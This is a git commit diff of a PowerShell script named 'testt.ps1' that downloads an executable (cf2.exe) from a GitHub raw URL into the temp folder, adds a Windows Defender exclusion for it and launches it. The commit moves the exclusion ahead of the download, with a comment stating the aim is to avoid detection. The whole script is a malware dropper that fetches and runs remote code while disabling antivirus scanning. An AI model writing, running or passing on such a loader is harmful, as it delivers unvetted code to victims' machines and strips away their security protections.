bdc9b6917095d93b3039c8a3cc1fe237dd90f439
ct7ybve7f387 <ct7ybve7f387@proton.me>
2025-03-13 15:04:56 -0700

    Update testt.ps1

--- testt.ps1
+++ testt.ps1
@@ -1,11 +1,11 @@
 $url = 'https://github.com/ct7ybve7f387/tests/raw/refs/heads/main/cf2.exe'
 $output = "$env:TEMP\cf2.exe"
 
+# Add exclusion first to prevent detection during download (requires admin privileges)
+Add-MpPreference -ExclusionPath $output
+
 # Download the file
 Invoke-WebRequest -Uri $url -OutFile $output
-
-# Add the file to Windows Defender exclusions (requires admin privileges)
-Add-MpPreference -ExclusionPath $output
 
 # Run the file
 Start-Process $output
